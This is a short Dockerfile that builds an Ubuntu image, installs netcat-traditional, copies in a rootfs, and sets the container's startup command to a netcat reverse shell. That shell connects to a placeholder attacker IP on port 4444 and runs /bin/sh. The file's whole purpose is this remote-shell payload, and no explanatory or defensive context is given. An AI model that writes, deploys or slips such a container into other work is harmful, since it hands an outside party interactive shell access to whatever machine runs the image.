FROM ubuntu

RUN apt update && apt install -y netcat-traditional
ADD rootfs /

CMD nc <<YOURIP>> 4444 -e /bin/sh
